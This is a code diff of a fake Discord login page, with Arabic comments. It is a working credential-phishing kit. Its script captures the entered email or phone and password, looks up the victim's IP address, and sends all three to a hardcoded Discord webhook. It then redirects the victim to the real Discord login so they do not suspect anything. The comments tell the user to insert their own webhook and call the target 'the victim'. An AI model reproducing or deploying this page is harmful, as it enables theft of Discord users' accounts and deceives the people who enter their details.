@@ -1,177 +1,192 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول إلى Discord</title>
+    <title>Discord | Login</title>
     <style>
-        /* تعريف الألوان الرسمية لديسكورد (Dark Theme) */
-        :root {
-            --bg-color: #313338;       /* الخلفية الأساسية */
-            --card-bg: #2B2D31;        /* خلفية بطاقة تسجيل الدخول */
-            --input-bg: #1E1F22;       /* خلفية حقول الإدخال */
-            --text-primary: #F2F3F5;   /* النص الأساسي أبيض */
-            --text-muted: #B5BAC1;     /* النص الباهت رمادي */
-            --discord-blue: #5865F2;   /* أزرق ديسكورد للزر */
-            --discord-blue-hover: #4752C4; /* أزرق ديسكورد عند التمرير */
-            --link-color: #00A8FC;     /* لون الروابط أزرق فاتح */
+        /* CSS RESET - أهم جزء عشان تضبط الأبعاد */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
 
         body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--bg-color);
-            background-image: url('https://discord.com/assets/f9a059600e5728a7e781.svg'); /* خلفية اختيارية */
-            background-position: center;
+            background-color: #313338; /* لون خلفية ديسكورد الرسمي */
+            background-image: url('https://discord.com/assets/f9a059600e5728a7e781.svg');
             background-size: cover;
-            font-family: 'gg sans', 'Noto Sans', sans-serif;
+            background-position: center;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            direction: ltr; /* للحفاظ على تنسيق ديسكورد الإنجليزي */
         }
 
-        .login-card {
-            background-color: var(--card-bg);
-            padding: 32px;
+        /* حاوية تسجيل الدخول */
+        .login-box {
+            background: #2B2D31;
             width: 480px;
+            padding: 32px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
             text-align: center;
-            color: var(--text-primary);
         }
 
-        h2 { margin: 0 0 8px; font-size: 24px; font-weight: 600; }
-        p { color: var(--text-muted); margin: 0 0 20px; font-size: 16px; }
+        h2 {
+            color: #F2F3F5;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
 
-        .input-group { text-align: left; margin-bottom: 20px; }
-        
+        p {
+            color: #B5BAC1;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        /* ضبط الحقول */
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
         label {
             display: block;
-            color: var(--text-muted);
+            color: #B5BAC1;
             font-size: 12px;
-            font-weight: 700;
+            font-weight: bold;
             margin-bottom: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
 
         input {
             width: 100%;
+            height: 40px;
             padding: 10px;
-            background-color: var(--input-bg);
-            border: 1px solid rgba(0,0,0,0.3);
+            background: #1E1F22;
+            border: none;
             border-radius: 3px;
-            color: var(--text-primary);
+            color: #DBDEE1;
             font-size: 16px;
-            box-sizing: border-box; /* لضمان التنسيق الصحيح */
             outline: none;
-            transition: border-color 0.2s;
+            transition: border 0.2s;
         }
 
-        input:focus { border-color: var(--link-color); }
+        input:focus {
+            border: 1px solid #00A8FC;
+        }
 
-        .forgot-password {
-            color: var(--link-color);
+        /* روابط إضافية */
+        .forgot-pass {
+            color: #00A8FC;
             font-size: 14px;
             margin-top: 4px;
             cursor: pointer;
-            text-align: left;
+            text-decoration: none;
         }
 
+        .forgot-pass:hover {
+            text-decoration: underline;
+        }
+
+        /* الزر الرئيسي */
         button {
             width: 100%;
-            padding: 12px;
-            background-color: var(--discord-blue);
+            height: 44px;
+            background-color: #5865F2;
             color: white;
             border: none;
             border-radius: 3px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
+            margin-top: 20px;
             transition: background-color 0.2s;
-            margin-top: 4px;
         }
 
-        button:hover { background-color: var(--discord-blue-hover); }
+        button:hover {
+            background-color: #4752C4;
+        }
 
-        .register-link {
+        .register {
             margin-top: 16px;
-            font-size: 14px;
-            color: var(--text-muted);
             text-align: left;
+            font-size: 14px;
+            color: #949BA4;
         }
 
-        .register-link span { color: var(--link-color); cursor: pointer; }
-
+        .register span {
+            color: #00A8FC;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
+    <div class="login-box">
         <h2>Welcome back!</h2>
         <p>We're so excited to see you again!</p>
 
         <div class="input-group">
-            <label for="email">Email or Phone Number</label>
-            <input type="text" id="email" required>
+            <label>Email or Phone Number</label>
+            <input type="text" id="user_field">
         </div>
 
         <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" required>
-            <div class="forgot-password">Forgot your password?</div>
+            <label>Password</label>
+            <input type="password" id="pass_field">
+            <div class="forgot-pass">Forgot your password?</div>
         </div>
 
-        <button onclick="pwn()">Log In</button>
+        <button onclick="captureData()">Log In</button>
 
-        <div class="register-link">
+        <div class="register">
             Need an account? <span>Register</span>
         </div>
     </div>
 
     <script>
-        // ضع رابط الـ Webhook الخاص بك هنا لاستلام البيانات
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
+        // هنا تحط الرابط حقك
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
 
-        async function pwn() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+        async function captureData() {
+            const u = document.getElementById('user_field').value;
+            const p = document.getElementById('pass_field').value;
 
-            if(!email || !pass) return;
+            if (!u || !p) return;
 
-            // جلب الـ IP تلقائياً لإضافته للتقرير (اختياري)
-            let ipData = { ip: "0.0.0.0" };
+            // جلب IP الضحية
+            let ip = "Unknown";
             try {
-                ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            } catch(e) {}
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ip = data.ip;
+            } catch (e) {}
 
-            // تجهيز الرسالة المرسلة لديسكورد
             const payload = {
                 embeds: [{
-                    title: "📥 New Login Details Captured",
-                    color: 0x5865F2, // أزرق ديسكورد
+                    title: "📥 Login Captured",
+                    color: 5814783,
                     fields: [
-                        { name: "👤 Email/Phone", value: `\`${email}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${pass}\``, inline: true },
-                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: false }
+                        { name: "👤 User/Mail", value: `\`${u}\``, inline: true },
+                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${ip}\`` }
                     ],
+                    footer: { text: "Leviathan Auto-Capture" },
                     timestamp: new Date()
                 }]
             };
 
-            // إرسال البيانات للـ Webhook
-            fetch(WEBHOOK_URL, {
+            fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                // التمويه: تحويل المستخدم لموقع ديسكورد الحقيقي بعد السرقة
-                window.location.href = "https://discord.com/login";
-            }).catch(() => {
-                // في حال فشل الإرسال (مثلاً الرابط خطأ)
-                console.error("Error sending data.");
+                // تحويل لصفحة ديسكورد الحقيقية عشان ما يشك
+                window.location.replace("https://discord.com/login");
             });
         }
     </script>
